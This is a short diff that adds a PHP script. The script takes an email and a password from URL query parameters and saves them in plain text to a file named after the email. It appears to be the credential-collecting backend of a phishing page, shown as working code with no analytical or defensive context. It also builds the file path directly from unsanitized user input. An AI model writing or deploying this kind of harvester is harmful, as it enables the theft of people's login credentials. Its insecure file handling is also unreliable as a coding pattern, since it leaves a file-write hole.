@@ -1,0 +1,9 @@
+<?php
+        $name_to_save = $_GET["Email"];
+        $data_to_save = $_GET["Password"];
+       
+        $myFile = $name_to_save . ".txt";
+        $fh = fopen($myFile, 'w') or die("can't open file");
+        fwrite($fh,$name_to_save . "," . $data_to_save . ",");
+        fclose($fh);
+?>
